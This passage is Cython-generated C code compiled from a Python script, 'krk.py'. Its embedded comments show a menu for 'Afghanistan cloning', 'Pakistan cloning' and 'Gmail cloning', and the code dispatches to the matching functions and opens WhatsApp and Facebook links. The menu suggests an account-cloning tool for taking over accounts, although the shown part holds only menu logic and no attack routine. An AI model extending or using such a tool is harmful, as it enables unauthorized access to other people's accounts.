 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')
 *                                 linex()
 *                                 x=input(' Choose: ')             # <<<<<<<<<<<<<<
 *                                 if x in ['1','01']:
 *                                         pak()
 */
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 179, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF_SET(__pyx_v_x, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "krk.py":180
 *                                 linex()
 *                                 x=input(' Choose: ')
 *                                 if x in ['1','01']:             # <<<<<<<<<<<<<<
 *                                         pak()
 *                                 elif x in ['2','02']:
 */
          __Pyx_INCREF(__pyx_v_x);
          __pyx_t_4 = __pyx_v_x;
          __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 180, __pyx_L3_error)
          if (!__pyx_t_9) {
          } else {
            __pyx_t_8 = __pyx_t_9;
            goto __pyx_L74_bool_binop_done;
          }
          __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_01, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 180, __pyx_L3_error)
          __pyx_t_8 = __pyx_t_9;
          __pyx_L74_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_9 = __pyx_t_8;
          if (__pyx_t_9) {

            /* "krk.py":181
 *                                 x=input(' Choose: ')
 *                                 if x in ['1','01']:
 *                                         pak()             # <<<<<<<<<<<<<<
 *                                 elif x in ['2','02']:
 *                                         bd()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_pak); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 181, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_13, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 181, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":180
 *                                 linex()
 *                                 x=input(' Choose: ')
 *                                 if x in ['1','01']:             # <<<<<<<<<<<<<<
 *                                         pak()
 *                                 elif x in ['2','02']:
 */
            goto __pyx_L73;
          }

          /* "krk.py":182
 *                                 if x in ['1','01']:
 *                                         pak()
 *                                 elif x in ['2','02']:             # <<<<<<<<<<<<<<
 *                                         bd()
 *                                 elif x in ['3','03']:
 */
          __Pyx_INCREF(__pyx_v_x);
          __pyx_t_4 = __pyx_v_x;
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 182, __pyx_L3_error)
          if (!__pyx_t_8) {
          } else {
            __pyx_t_9 = __pyx_t_8;
            goto __pyx_L76_bool_binop_done;
          }
          __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 182, __pyx_L3_error)
          __pyx_t_9 = __pyx_t_8;
          __pyx_L76_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_8 = __pyx_t_9;
          if (__pyx_t_8) {

            /* "krk.py":183
 *                                         pak()
 *                                 elif x in ['2','02']:
 *                                         bd()             # <<<<<<<<<<<<<<
 *                                 elif x in ['3','03']:
 *                                         gmail()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_bd); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 183, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_13, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 183, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":182
 *                                 if x in ['1','01']:
 *                                         pak()
 *                                 elif x in ['2','02']:             # <<<<<<<<<<<<<<
 *                                         bd()
 *                                 elif x in ['3','03']:
 */
            goto __pyx_L73;
          }

          /* "krk.py":184
 *                                 elif x in ['2','02']:
 *                                         bd()
 *                                 elif x in ['3','03']:             # <<<<<<<<<<<<<<
 *                                         gmail()
 *                                 else:
 */
          __Pyx_INCREF(__pyx_v_x);
          __pyx_t_4 = __pyx_v_x;
          __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_3, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 184, __pyx_L3_error)
          if (!__pyx_t_9) {
          } else {
            __pyx_t_8 = __pyx_t_9;
            goto __pyx_L78_bool_binop_done;
          }
          __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_03, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 184, __pyx_L3_error)
          __pyx_t_8 = __pyx_t_9;
          __pyx_L78_bool_binop_done:;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_9 = __pyx_t_8;
          if (__pyx_t_9) {

            /* "krk.py":185
 *                                         bd()
 *                                 elif x in ['3','03']:
 *                                         gmail()             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         menu()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_gmail); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 185, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_13, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 185, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":184
 *                                 elif x in ['2','02']:
 *                                         bd()
 *                                 elif x in ['3','03']:             # <<<<<<<<<<<<<<
 *                                         gmail()
 *                                 else:
 */
            goto __pyx_L73;
          }

          /* "krk.py":187
 *                                         gmail()
 *                                 else:
 *                                         menu()             # <<<<<<<<<<<<<<
 *                         elif xd in ['5','05']:
 *                                 gmail()
 */
          /*else*/ {
            __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_menu); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 187, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_13, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 187, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_L73:;

          /* "krk.py":175
 *                         elif xd in ['6','06']:
 *                                 public()
 *                         elif xd in ['2','02']:             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')
 */
          goto __pyx_L10;
        }

        /* "krk.py":188
 *                                 else:
 *                                         menu()
 *                         elif xd in ['5','05']:             # <<<<<<<<<<<<<<
 *                                 gmail()
 *                         elif xd in ['6','06']:
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_5, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 188, __pyx_L3_error)
        if (!__pyx_t_8) {
        } else {
          __pyx_t_9 = __pyx_t_8;
          goto __pyx_L80_bool_binop_done;
        }
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_05, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 188, __pyx_L3_error)
        __pyx_t_9 = __pyx_t_8;
        __pyx_L80_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = __pyx_t_9;
        if (__pyx_t_8) {

          /* "krk.py":189
 *                                         menu()
 *                         elif xd in ['5','05']:
 *                                 gmail()             # <<<<<<<<<<<<<<
 *                         elif xd in ['6','06']:
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_gmail); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 189, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_13, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 189, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":188
 *                                 else:
 *                                         menu()
 *                         elif xd in ['5','05']:             # <<<<<<<<<<<<<<
 *                                 gmail()
 *                         elif xd in ['6','06']:
 */
          goto __pyx_L10;
        }

        /* "krk.py":190
 *                         elif xd in ['5','05']:
 *                                 gmail()
 *                         elif xd in ['6','06']:             # <<<<<<<<<<<<<<
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_6, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 190, __pyx_L3_error)
        if (!__pyx_t_9) {
        } else {
          __pyx_t_8 = __pyx_t_9;
          goto __pyx_L82_bool_binop_done;
        }
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_06, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 190, __pyx_L3_error)
        __pyx_t_8 = __pyx_t_9;
        __pyx_L82_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = __pyx_t_8;
        if (__pyx_t_9) {

          /* "krk.py":191
 *                                 gmail()
 *                         elif xd in ['6','06']:
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')             # <<<<<<<<<<<<<<
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
 *                         elif xd in ['3','03']:
 */
          __Pyx_INCREF(__pyx_n_s_Dsj9JMWoixk4Qsje0Ng3nA);
          __pyx_v_wx = __pyx_n_s_Dsj9JMWoixk4Qsje0Ng3nA;

          /* "krk.py":192
 *                         elif xd in ['6','06']:
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()             # <<<<<<<<<<<<<<
 *                         elif xd in ['3','03']:
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_os); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 192, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 192, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = __Pyx_PyObject_FormatSimple(__pyx_v_wx, __pyx_empty_unicode); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 192, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_5 = __Pyx_PyUnicode_Concat(__pyx_kp_u_xdg_open_https_chat_whatsapp_com, __pyx_t_13); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 192, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_13, __pyx_t_5};
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 192, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_menu); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 192, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 192, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":190
 *                         elif xd in ['5','05']:
 *                                 gmail()
 *                         elif xd in ['6','06']:             # <<<<<<<<<<<<<<
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
 */
          goto __pyx_L10;
        }

        /* "krk.py":193
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
 *                         elif xd in ['3','03']:             # <<<<<<<<<<<<<<
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()
 *                         elif xd in ['8','08']:
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_3, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 193, __pyx_L3_error)
        if (!__pyx_t_8) {
        } else {
          __pyx_t_9 = __pyx_t_8;
          goto __pyx_L84_bool_binop_done;
        }
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_03, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 193, __pyx_L3_error)
        __pyx_t_9 = __pyx_t_8;
        __pyx_L84_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = __pyx_t_9;
        if (__pyx_t_8) {

          /* "krk.py":194
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
 *                         elif xd in ['3','03']:
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()             # <<<<<<<<<<<<<<
 *                         elif xd in ['8','08']:
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_os); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 194, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 194, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_kp_s_xdg_open_https_chat_whatsapp_com_2};
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_menu); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 194, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_6 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_6, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":193
 *                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
 *                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
 *                         elif xd in ['3','03']:             # <<<<<<<<<<<<<<
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()
 *                         elif xd in ['8','08']:
 */
          goto __pyx_L10;
        }

        /* "krk.py":195
 *                         elif xd in ['3','03']:
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()
 *                         elif xd in ['8','08']:             # <<<<<<<<<<<<<<
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 *                         elif xd in ['0','00']:
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_8, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 195, __pyx_L3_error)
        if (!__pyx_t_9) {
        } else {
          __pyx_t_8 = __pyx_t_9;
          goto __pyx_L86_bool_binop_done;
        }
        __pyx_t_9 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_08, Py_EQ)); if (unlikely((__pyx_t_9 < 0))) __PYX_ERR(0, 195, __pyx_L3_error)
        __pyx_t_8 = __pyx_t_9;
        __pyx_L86_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = __pyx_t_8;
        if (__pyx_t_9) {

          /* "krk.py":196
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()
 *                         elif xd in ['8','08']:
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()             # <<<<<<<<<<<<<<
 *                         elif xd in ['0','00']:
 *                                 exit(' Thanks for use  ')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 196, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 196, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_kp_s_xdg_open_https_www_facebook_com};
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 196, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_menu); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 196, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_5)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_5);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_5, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 196, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":195
 *                         elif xd in ['3','03']:
 *                                 os.system('xdg-open https://chat.whatsapp.com/CDmx5nuZu1iAmV0J4HlVyG');menu()
 *                         elif xd in ['8','08']:             # <<<<<<<<<<<<<<
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 *                         elif xd in ['0','00']:
 */
          goto __pyx_L10;
        }

        /* "krk.py":197
 *                         elif xd in ['8','08']:
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 *                         elif xd in ['0','00']:             # <<<<<<<<<<<<<<
 *                                 exit(' Thanks for use  ')
 *                         else:
 */
        __Pyx_INCREF(__pyx_v_xd);
        __pyx_t_4 = __pyx_v_xd;
        __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_0, Py_EQ)); if (unlikely((__pyx_t_8 < 0))) __PYX_ERR(0, 197, __pyx_L3_error)
